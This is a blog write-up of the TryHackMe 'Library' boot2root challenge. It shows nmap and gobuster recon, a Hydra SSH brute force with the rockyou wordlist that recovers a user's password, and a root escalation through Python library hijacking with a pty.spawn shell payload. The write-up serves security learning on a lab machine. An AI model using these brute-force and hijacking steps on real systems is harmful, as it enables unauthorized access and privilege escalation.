---
title: "TryHackMe - Library CTF"
summary: A writeup of a boot2root CTF challenge on TryHackMe involving SSH brute-forcing with Hydra and privilege escalation via Python library hijacking to gain root.
date: 2022-03-08 00:34:00 +0800
# categories: [CTF Writeups]
# tags: [TryHackMe, THM, Python Library Hijacking, CTF, Capture the flag]
showtoc: true
tocopen: false
---

**Library** is a TryHackMe boot2root machine created for FIT and BSides Guatemala CTF.

Room link: [https://tryhackme.com/room/bsidesgtlibrary](https://tryhackme.com/room/bsidesgtlibrary)

# Reconnaissance

## Nmap — Port Scanning

```bash
root@mirai:~# nmap -T4 -sC -sV -p- --min-rate=1000 10.10.85.187 -Pn
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2022-03-08 15:55 HKT
Nmap scan report for 10.10.85.187
Host is up (0.24s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c4:2f:c3:47:67:06:32:04:ef:92:91:8e:05:87:d5:dc (RSA)
|   256 68:92:13:ec:94:79:dc:bb:77:02:da:99:bf:b6:9d:b0 (ECDSA)
|_  256 43:e8:24:fc:d8:b8:d3:aa:c2:48:08:97:51:dc:5b:7d (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome to  Blog - Library Machine
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 85.22 seconds
```

Two ports are open: **SSH (22)** and **HTTP (80)**. Let's start with some passive recon on the web server.

## Website Enumeration

Browsing the site reveals several usernames worth noting for later use:

- `meliodas`
- `root`
- `www-data`
- `Anonymous`

Since the navigation menu links aren't clickable, there are no other pages to explore. Time to scan for hidden directories.

## Gobuster — Directory Enumeration

```bash
root@mirai:~# gobuster dir -u 10.10.85.187 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,txt,html --timeout 50s -t 170 -f
===============================================================
2022/03/08 01:36:48 Starting gobuster in directory enumeration mode
===============================================================
/images/              (Status: 200) [Size: 1640]
/icons/               (Status: 403) [Size: 292]
/index.html           (Status: 200) [Size: 5439]
/robots.txt           (Status: 200) [Size: 33]
```

Opening `robots.txt` in the browser gives an interesting hint:

![robots.txt content showing "rockyou"](/img/thm-library-writeup/rockyou.png)

> **Hint:** The word "rockyou" is a strong clue — it's the name of the most well-known password wordlist (`rockyou.txt`). This suggests we should try brute-forcing something.

Port 22 (SSH) is open and we have a potential username — let's try brute-forcing it with Hydra.

## Hydra — SSH Brute Force

```bash
hydra -L meliodas_users -P /usr/share/wordlists/rockyou.txt ssh://10.10.85.187 -t 4
```

![Hydra successfully cracking the SSH password](/img/thm-library-writeup/hydra.png)

Hydra successfully cracks the credentials. The password for `meliodas` is `iloveyou1`.

# Initial Access — User Flag

Log in over SSH and grab the `user.txt` flag:

![SSH login and user.txt flag](/img/thm-library-writeup/user3.png)

# Privilege Escalation — `meliodas` → `root`

## Enumeration with `sudo -l`

Running `sudo -l` reveals we can execute `/home/meliodas/bak.py` as root, even though the file is owned by `root`.

![sudo -l output](/img/thm-library-writeup/sudo.png)

Let's inspect the script:

```python
#!/usr/bin/env python
import os
import zipfile

def zipdir(path, ziph):
    for root, dirs, files in os.walk(path):
        for file in files:
            ziph.write(os.path.join(root, file))

if __name__ == '__main__':
    zipf = zipfile.ZipFile('/var/backups/website.zip', 'w', zipfile.ZIP_DEFLATED)
    zipdir('/var/www/html', zipf)
    zipf.close()
```

The script itself isn't vulnerable to direct code injection. However, it imports the `os` and `zipfile` modules — which opens the door to **Python Library Hijacking**.

## Python Library Hijacking

When Python imports a module, it searches directories in a specific order, starting with the **current directory**. If we place a malicious file named after a module in the same directory as the script, Python will import *our* file instead of the real library.

Reference: [Privilege Escalation via Python Library Hijacking](https://rastating.github.io/privilege-escalation-via-python-library-hijacking/)

**Step 1:** Create a fake `os.py` in the same directory as `bak.py`:

```python
import pty
pty.spawn('/bin/bash')
```

**Step 2:** Run the script with sudo:

```bash
sudo /usr/bin/python3 /home/meliodas/bak.py
```

![Attempting os.py hijack](/img/thm-library-writeup/os.png)

The `os` module hijack didn't work in this case. Let's try the same approach with the `zipfile` module instead — and this time it succeeds!

![Root shell obtained](/img/thm-library-writeup/root.png)

We're root!

---

# Bonus: Easier Path to Root

Since `meliodas` has write permission in the home directory, there's an even simpler approach:

1. Delete `bak.py`
2. Create a new `bak.py` with the following content:

```python
import pty
pty.spawn('/bin/bash')
```

3. Run it with `sudo /usr/bin/python3 /home/meliodas/bak.py` and you'll drop straight into a root shell.

![Root shell via replaced bak.py](/img/thm-library-writeup/root2.png)

# Summary

| Step | Technique | Tool |
|------|-----------|------|
| Recon | Port & directory scanning | Nmap, Gobuster |
| Initial Access | SSH brute force using `rockyou.txt` hint | Hydra |
| Privilege Escalation | Python library hijacking (`zipfile`) | Manual |
| Alternate PrivEsc | Replace root-owned script with spawn shell | Manual |